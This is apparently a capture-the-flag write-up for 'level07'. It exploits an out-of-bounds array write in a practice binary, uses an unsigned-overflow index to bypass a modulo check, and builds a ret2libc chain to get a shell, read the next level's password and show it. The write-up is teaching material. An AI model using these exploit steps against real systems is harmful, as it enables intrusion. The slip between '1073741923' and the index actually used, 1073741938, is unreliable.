# level07

after login to `level07` user, there's an `level07` executable in the home directory.

the program promts for input, it prints it back and exits.

after disassembling it, you will find it at [source.c](source.c).

the program is declaring an array of 100 unsigned integers, and has two functions to read and write to that array.

the `store_number` function takes an integer as argument, prompts for an index and a number, and stores the number at the given index in the array, but it does not check if the index is within bounds.

there's also a canary protection enabled. so we need to find the exact offset to the return address to overwrite it.

first we need to find the total bytes of local variables to calculate the offset to the return address.

i find out that there's a total of `452` bytes of local variables, we need to add `4` bytes of canary, so the total offset to the return address is `456` bytes. so it is at `456 / 4` = `114` index in the array.

but we have another problem, there's a check `if ((index % 3 == 0) || (number >> 24 == 183))` that prevents us from writing to the return address, because `114 % 3 == 0`, so we need to find a workaround for that. we will use `unsigned int` overflow to bypass that check.

`X` is the index we want to write to, which is `114`.

`X * 4 = 456 + 4294967296`

as we know that `4294967296` is `2^32`, so it will overflow and become `0` when we cast it to `unsigned int`. plus `456` is the actual offset in bytes to the return address. `456 + 4294967296 = 4294967752`, then `4294967752 / 4 = 1073741938`, so `1073741923` is our magic number that is pass the check because `1073741923 % 3 == 1`, and when it is multiplied by `4` and casted to `unsigned int`, it will overflow and become `456`, which is the actual offset in bytes to the return address.

let's try that out.

```sh
Input command: store
 Number: 1094795585
 Index: 1073741938
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

we have successfully overwritten the return address with `0x41414141`, which is `1094795585` in decimal.

now we will use `ret2libc` technique to get a shell.

we need three addresses for that, the address of `system` function, the address of `exit` function, and the address of the string `/bin/sh`.

let's find them.

```sh
(gdb) p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$4 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb)
```

good, we have the addresses we need. we need now to convert them to decimal and use them as input for the `store` command.

system address: `0xf7e6aed0` = `4159090384` in decimal
exit address: `0xf7e5eb70` = `4159040368` in decimal
/bin/sh address: `0xf7f897ec` = `4160264172` in decimal

```sh
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

we have successfully overwritten the return address to call `system("/bin/sh")`, and we got a shell and read the flag.

a script is created to automate the process, you can find it at [exploit.sh](resources/exploit.sh).
